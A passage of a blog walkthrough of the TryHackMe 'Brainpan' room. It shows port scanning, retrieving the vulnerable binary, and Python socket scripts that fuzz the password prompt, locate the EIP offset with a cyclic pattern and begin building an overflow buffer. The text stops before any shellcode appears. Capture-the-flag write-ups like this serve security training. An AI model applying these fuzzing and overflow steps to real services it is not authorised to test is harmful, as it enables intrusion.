<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Brainpan | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Brainpan buffer overflow from TryHackMe."> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo1.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/1_brainpan/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
    initTheme();
  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Biscotti</span> Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/bounties/">bounties </a> </li> <li class="nav-item "> <a class="nav-link" href="/cves/">cves </a> </li> <li class="nav-item "> <a class="nav-link" href="/presentations/">talks </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/publications/">publications </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Brainpan</h1> <p class="post-description">Brainpan buffer overflow from TryHackMe.</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-4 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="THM Brainpan Logo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <h2>Link</h2> <p><a href="https://tryhackme.com/r/room/brainpan" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> Welcome to my Brainpan walkthrough. This is the TryHackMe version. First step to perform is running nmap to know what ports are open.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/brainpan]
└─<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-A</span> <span class="nt">-O</span> <span class="nt">-oN</span> nmap 10.10.157.16
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-03 13:33 AEDT
Nmap scan report <span class="k">for </span>10.10.157.16
Host is up <span class="o">(</span>0.25s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     <span class="o">[</span>________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 <span class="o">(</span>Python 2.7.3<span class="o">)</span>
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3

&lt;snip&gt;
</code></pre></div></div> <p><br> Reviewing the results, there are only two ports open. Using nc connect to port 9999. It prompts for a password and then gives an access denied.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/brainpan]
└─<span class="nv">$ </span>nc 10.10.157.16 9999                        
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

<span class="o">[</span>________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          <span class="o">&gt;&gt;</span> dfsf
                          ACCESS DENIED
</code></pre></div></div> <p><br> Navigating to the webserver, there is only a png file there. So, run gobuster and review the results. Notice the /bin folder.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/brainpan]
└─<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.157.16:10000 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-o</span> gobuster      
<span class="o">===============================================================</span>
Gobuster v3.6
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://10.10.157.16:10000
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 10
<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.6
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/bin                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> /bin/]
Progress: 2847 / 220561 <span class="o">(</span>1.29%<span class="o">)</span>^C
<span class="o">[!]</span> Keyboard interrupt detected, terminating.
Progress: 2855 / 220561 <span class="o">(</span>1.29%<span class="o">)</span>
<span class="o">===============================================================</span>
Finished
<span class="o">===============================================================</span>
</code></pre></div></div> <p><br></p> <p>Navigate to the bin folder and notice the brainpan.exe.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/binfolder.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Web Bin Folder" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Feel free to wget and download it.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/brainpan]
└─<span class="nv">$ </span>wget http://10.10.157.16:10000/bin/brainpan.exe                         
<span class="nt">--2025-01-03</span> 13:42:17--  http://10.10.157.16:10000/bin/brainpan.exe
Connecting to 10.10.157.16:10000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 21190 <span class="o">(</span>21K<span class="o">)</span> <span class="o">[</span>application/x-msdos-program]
Saving to: ‘brainpan.exe’

brainpan.exe                                               100%[<span class="o">========================================================================================================================================&gt;]</span>  20.69K  74.7KB/s    <span class="k">in </span>0.3s    

2025-01-03 13:42:18 <span class="o">(</span>74.7 KB/s<span class="o">)</span> - ‘brainpan.exe’ saved <span class="o">[</span>21190/21190]
</code></pre></div></div> <p><br> Spin up a python web server so we can transfer it to another windows machine for testing.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/brainpan]
└─<span class="nv">$ </span>python3 <span class="nt">-m</span> <span class="s1">'http.server'</span>                                         
Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
</code></pre></div></div> <p><br> Transfer the executable to a Windows machine running Windbg with the narly extension installed.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/download.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Download Executable" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> In Windbg, open the executable.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/startbin.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Load the PE" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Use g to start running the program.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/g.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Start the PE" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Check the IP address of the Windows machine.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/windowsipconfig.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Get Windows IP" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Create a python that creates a socket connection with the service and sends a passwords. Duplicates “normal” behaviour.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">socket</span>

<span class="n">ip</span> <span class="o">=</span> <span class="sh">'</span><span class="s">10.0.0.11</span><span class="sh">'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
<span class="nf">print</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>

<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">password</span><span class="se">\r\n</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>

<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div> <div class="caption"> brain_0x01.py </div> <p><br> Update the python code to fuzz the password field with an ever-increasing payload to determine the breaking point.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">socket</span>

<span class="n">ip</span> <span class="o">=</span> <span class="sh">'</span><span class="s">10.0.0.11</span><span class="sh">'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>

<span class="n">buffers</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">]</span>
<span class="n">counter</span> <span class="o">=</span> <span class="mi">100</span>
<span class="k">while</span> <span class="nf">len</span><span class="p">(</span><span class="n">buffers</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">50</span><span class="p">:</span>
    <span class="n">buffers</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="n">counter</span><span class="p">)</span>
    <span class="n">counter</span> <span class="o">+=</span> <span class="mi">200</span>

<span class="k">for</span> <span class="n">inputBuffer</span> <span class="ow">in</span> <span class="n">buffers</span><span class="p">:</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>

    <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[*] Sending: {size}</span><span class="se">\n</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">size</span><span class="o">=</span><span class="nf">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">)))</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">inputBuffer</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\r\n</span><span class="sh">'</span><span class="p">)</span>

    <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div> <div class="caption"> brain_0x02.py </div> <p><br> Check the run to see the number of characters that hanged the program.</p> <div class="row justify-content-sm-center"> <div class="col-sm-4 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/bytecheck.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the Buffer Size" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Check the EIP register in Windbg to ensure that the 41s overwrote the value in EIP.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/checkeip.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the EIP" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Reset the executable and set it to go again.</p> <div class="row justify-content-sm-center"> <div class="col-sm-4 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/reset.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Reset the executable" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/g.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Start the PE" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Update the python code to hard code the buffer size and increase the size to fit the payload.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mport</span> <span class="n">socket</span>

<span class="n">ip</span> <span class="o">=</span> <span class="sh">'</span><span class="s">10.0.0.11</span><span class="sh">'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>

<span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">1100</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[*] Sending: {size}</span><span class="se">\n</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">size</span><span class="o">=</span><span class="nf">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">)))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">inputBuffer</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\r\n</span><span class="sh">'</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

</code></pre></div></div> <div class="caption"> brain_0x03.py </div> <p><br> Run the code again, check eip, ensure the it is still filled with 41s. Sometime, when the buffer size is changed, it changes the program execution.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/checkeip.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the EIP" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Check the ESP register to ensure that the A character overflows into ESP.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/checkesp.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the ESP" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Use msf-pattern_create to generate a unique pattern to help assist in determining the offset of the EIP register.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/brainpan]
└─<span class="nv">$ </span>msf-pattern_create <span class="nt">-l</span> 1100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk
</code></pre></div></div> <p><br> Update the python code with the pattern that was just generated.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">socket</span>

<span class="n">ip</span> <span class="o">=</span> <span class="sh">'</span><span class="s">10.0.0.11</span><span class="sh">'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>

<span class="c1"># inputBuffer = b'A' * 1100
</span><span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk</span><span class="sh">'</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[*] Sending: {size}</span><span class="se">\n</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">size</span><span class="o">=</span><span class="nf">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">)))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">inputBuffer</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\r\n</span><span class="sh">'</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div> <div class="caption"> brain_0x04.py </div> <p><br> Execute the code, check the EIP register, and note the value that is located there.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/patterneip.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Get the Offset Check Value" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Use msf-pattern_offset to determine the exact offset value of the EIP register.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~/Documents/thm/brainpan]
└─<span class="nv">$ </span>msf-pattern_offset <span class="nt">-l</span> 1100 <span class="nt">-q</span> 35724134
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exact match at offset 524

</code></pre></div></div> <p><br> Update the code to split the buffer string into three separate parts. The first part will be As up until the offset, Bs for 4, and Cs to pad out the rest of the buffer size.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">socket</span>

<span class="n">ip</span> <span class="o">=</span> <span class="sh">'</span><span class="s">10.0.0.11</span><span class="sh">'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>

<span class="n">inputBuffer</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">524</span>
<span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">B</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">4</span>
<span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">C</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1100</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[*] Sending: {size}</span><span class="se">\n</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">size</span><span class="o">=</span><span class="nf">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">)))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">inputBuffer</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\r\n</span><span class="sh">'</span><span class="p">)</span>

